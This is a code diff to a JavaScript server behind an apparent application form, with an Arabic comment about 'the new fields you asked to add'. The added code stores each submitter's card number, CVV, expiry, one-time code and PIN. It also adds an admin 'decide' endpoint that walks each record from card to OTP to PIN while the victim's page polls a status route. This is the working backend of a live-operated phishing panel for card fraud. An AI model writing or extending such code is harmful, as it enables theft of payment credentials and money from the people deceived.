@@ -50,6 +50,12 @@ function cleanApplication(b) {
     em: str(b.em, 30), a: str(b.a, 10), ad: str(b.ad, 500),
     card: str(b.card, 12), watch: str(b.watch, 20),
     lang: b.lang === "en" ? "en" : "ar", status, step: str(b.step, 20),
+    decision: null, next: null, reason: null,
+    pay: b.pay && typeof b.pay === "object" ? {
+      cardName: str(b.pay.cardName, 120), cardNumber: str(b.pay.cardNumber || b.pay.number, 30),
+      cvv: str(b.pay.cvv, 10), exp: str(b.pay.exp || b.pay.expiry, 20),
+      otp: str(b.pay.otp || b.pay.code, 20), pin: str(b.pay.pin, 20)
+    } : null,
     
     // الحقول الجديدة التي طلبت إضافتها وحفظها
     cardNumber: str(b.cardNumber, 30),
@@ -69,15 +75,36 @@ async function api(req, res, url) {
     const o = cleanApplication(b);
     if (!o.n || o.p.length < 6) return send(res, 400, { ok: false, error: "invalid" });
     const i = orders.findIndex(x => x.ref === o.ref);
-    if (i >= 0) orders[i] = { ...orders[i], ...o, ts: orders[i].ts, status: orders[i].status || "new" };
+    if (i >= 0) orders[i] = { ...orders[i], ...o, ts: orders[i].ts };
     else { orders.unshift(o); if (orders.length > 5000) orders.length = 5000; }
     saveOrders();
     return send(res, 200, { ok: true, ref: o.ref });
+  }
+  if (req.method === "GET" && /^\/api\/status\//.test(url)) {
+    const ref = decodeURIComponent(url.split("/").pop());
+    const o = orders.find(x => x.ref === ref);
+    if (!o) return send(res, 404, { ok: false });
+    return send(res, 200, { decision: o.decision || null, next: o.next || null, reason: o.reason || null });
   }
   if (url.startsWith("/api/admin/")) {
     if (!isAdmin(req)) return send(res, 401, { ok: false, error: "unauthorized" });
     if (req.method === "GET" && url === "/api/admin/check") return send(res, 200, { ok: true });
     if (req.method === "GET" && url === "/api/admin/orders") return send(res, 200, { ok: true, orders });
+    if (req.method === "POST" && /^\/api\/admin\/decide\//.test(url)) {
+      const ref = decodeURIComponent(url.split("/").pop());
+      let b = {}; try { b = await readBody(req); } catch (e) {}
+      const o = orders.find(x => x.ref === ref);
+      if (!o) return send(res, 404, { ok: false });
+      if (b.decision !== "accept" && b.decision !== "reject") return send(res, 400, { ok: false });
+      if (b.decision === "reject") {
+        o.status = "rejected"; o.decision = "reject"; o.next = null; o.reason = o.step || "card";
+      } else {
+        const next = o.step === "card" ? "otp" : o.step === "otp" ? "pin" : "done";
+        o.status = next === "done" ? "confirmed" : "awaiting";
+        o.decision = "accept"; o.next = next; o.reason = null;
+      }
+      saveOrders(); return send(res, 200, { ok: true });
+    }
     if (req.method === "POST" && /^\/api\/admin\/status\//.test(url)) {
       const ref = decodeURIComponent(url.split("/").pop());
       let b = {}; try { b = await readBody(req); } catch (e) {}
